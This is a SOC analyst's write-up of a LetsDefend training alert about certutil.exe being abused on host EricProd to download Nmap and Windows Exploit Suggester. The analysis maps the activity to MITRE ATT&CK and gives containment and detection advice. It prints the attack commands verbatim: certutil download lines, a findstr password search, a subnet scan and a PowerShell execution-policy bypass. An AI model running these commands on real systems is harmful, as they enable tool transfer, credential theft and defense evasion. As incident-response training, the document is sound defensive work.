# SOC163 – Suspicious Certutil.exe Usage

**Platform:** LetsDefend | **Severity:** Medium | **Classification:** True Positive | **Date:** March 1, 2022 **Host:** `EricProd` (`172.16.17.22`) | **Binary:** `certutil.exe` | **Event ID:** 113

## Summary

A user on EricProd abused the built-in Windows tool `certutil.exe` to download Nmap and a privilege escalation script, then ran a network scan. Terminal history shows a full chain of discovery, privilege escalation enumeration and credential hunting over about 11 hours, so the alert was closed as a true positive.

![01-alert-details](images/soc163-01-alert-details.png)

## The Attack

**Living-off-the-land binaries (LOLBins)** are legitimate, Microsoft-signed tools that attackers repurpose. Because they ship with Windows, they rarely trigger antivirus and often get past download controls.

`certutil.exe` is meant for managing certificates, but `-urlcache -split -f <url> <file>` turns it into a file downloader. `-urlcache` fetches the URL, `-split` writes it to disk, and `-f` forces an overwrite.

## Timeline

| Time (alert) | Event |
|--------------|-------|
| 10:11–10:27 | Discovery commands: `whoami`, `net user`, `ipconfig /all`, `net localgroup`, `net start`, `netstat`, `tasklist`, `systeminfo` |
| 11:06 | `certutil` downloads Nmap, saving the setup EXE as `nmap.zip` (alert fires at 11:06:20) |
| 11:07 | `certutil` downloads Windows Exploit Suggester, renamed to `check.py` |
| 11:08 | `nmap -sV 192.168.0.0/24 -p 80` scans a subnet for web servers |
| 11:27 | `python3 check.py` runs the exploit suggester |
| 18:54 | `arp -a` lists neighboring hosts |
| 19:32 | `findstr /si pass *.txt \| *.xml \| *.ini` searches files for passwords |
| 21:36 | `powershell.exe -nop -exec bypass` launches PowerShell with execution policy bypassed |

## Investigation

### 1. Alert Analysis

- **Host:** `EricProd` (`172.16.17.22`)
- **Binary:** `C:/Windows/System32/certutil.exe`
- **Parent Process:** `C:/Windows/System32/cmd.exe`
- **Trigger:** `-f` parameter with `certutil.exe`
- **EDR Action:** Allowed

```
certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip
```

The parent process is `cmd.exe`, so the command was typed at an interactive prompt rather than spawned by a document or browser. The binary's MD5 (`f17616ec0522fc5633151f7caa278caa`) belongs to the genuine Microsoft certutil, which is why a hash lookup alone would not flag it.

![02-certutil-parent-process](images/soc163-02-certutil-parent-process.png)

### 2. Process Analysis

The Processes tab confirms both downloads were used: `nmap.exe` ran with `nmap -sV 192.168.0.0/24 -p 80`, and a second certutil command line fetched the exploit suggester from GitHub. The remaining processes (`explorer.exe`, `outlook.exe`, `winlogon.exe` and others) are normal Windows and VMware software.

![03-processes](images/soc163-03-processes.png)

### 3. Terminal History Analysis

Terminal history shows 17 commands that follow a standard post-exploitation sequence:

- **Discovery (10:11–10:27):** account, group, network, service, process and OS enumeration.
- **Tool transfer (11:06–11:07):** Nmap and Windows Exploit Suggester, both downloaded with certutil and both disguised (`.exe` saved as `.zip`, `.py` renamed to `check.py`).
- **Privilege escalation prep (10:27 → 11:27):** `systeminfo` output is exactly what Windows Exploit Suggester takes as input to list unpatched vulnerabilities.
- **Credential access (19:32):** `findstr /si pass` searches every text, XML and INI file for stored passwords.
- **Defense evasion (21:36):** `-exec bypass` disables PowerShell's script execution policy.

![04-terminal-history-1](images/soc163-04-terminal-history-1.png)

![05-terminal-history-2](images/soc163-05-terminal-history-2.png)

### 4. Verdict Reasoning

Nmap is a legitimate tool from its official site, so the download alone could be an admin task. Together, the clues rule that out:

| Clue | Meaning |
|------|---------|
| certutil used as a downloader | Deliberate use of a LOLBin to avoid detection |
| Tools renamed (`check.py`, `nmap.zip`) | Attempt to hide what was downloaded |
| `systeminfo` then exploit suggester | Searching for a privilege escalation path |
| `findstr /si pass` | Credential hunting, no admin purpose on a production host |
| Production host, no sign of a planned test | Not an announced pentest |

The activity is a **true positive**: hands-on-keyboard reconnaissance and credential hunting on a production server.

## Artifacts

| Type | Indicator |
|------|-----------|
| Host | `EricProd` (`172.16.17.22`) |
| Command | `certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip` |
| Command | `certutil.exe -urlcache -split -f https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py check.py` |
| Command | `nmap -sV 192.168.0.0/24 -p 80` |
| Scan target | `192.168.0.0/24` |
| File | `check.py` (renamed `windows-exploit-suggester.py`) |

## Response and Recommendations

Contain EricProd and treat the account that ran these commands as compromised: reset its password, revoke sessions and review where else it has logged in. Check `192.168.0.0/24` web servers for follow-up access, and review activity after the 21:36 PowerShell session for payloads or data leaving the host.

To prevent a repeat, alert on or block certutil `-urlcache` downloads, restrict PowerShell execution policy bypasses, and audit `findstr` searches for credential keywords on servers.

## Conclusion

**True Positive.** A user on EricProd abused `certutil.exe` to download Nmap and Windows Exploit Suggester, scanned a subnet, enumerated the host for privilege escalation and searched files for passwords.

**MITRE ATT&CK:** T1105 (Ingress Tool Transfer), T1059 (Command and Scripting Interpreter), T1595 (Active Scanning), T1046 (Network Service Discovery), T1082 (System Information Discovery), T1087 (Account Discovery), T1016 (System Network Configuration Discovery), T1018 (Remote System Discovery), T1552.001 (Unsecured Credentials: Credentials in Files)
